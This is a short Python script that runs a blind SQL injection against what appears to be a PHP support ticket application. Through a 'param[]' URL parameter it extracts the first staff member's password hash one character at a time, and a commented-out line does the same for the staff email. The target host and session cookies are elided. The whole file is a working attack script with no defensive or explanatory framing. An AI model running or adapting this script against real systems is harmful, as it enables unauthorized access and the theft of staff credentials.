
```
import requests
import string

def blindInject(query):
    url = f"http://.../support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 {query}"
    cookies = {'PHPSESSID':'...', 'usrhash':'...'}
    response = requests.get(url, cookies=cookies)
    rContentType = response.headers["Content-Type"]
    #print(f"[DEBUG] CT: {rContentType}, Len: {len(response.content)}")
    if rContentType == '...':
        return True
    else:
        return False

keyspace = 'abcdef0123456789'
#char = list(string.ascii_lowercase) + list(string.digits) + ['@', '_','.']
for i in range(1,41):
    for c in keyspace:
    #for c in char:
        inject = f"and substr((select password from staff limit 0,1),{i},1) = '{c}'"
        #inject = f"and substr((select email from staff limit 0,1),{i},1) = '{c}'"
        #print(inject)
        if blindInject(inject):
            #print(f"success: {c}")
            print(c, end='', flush=True)
```
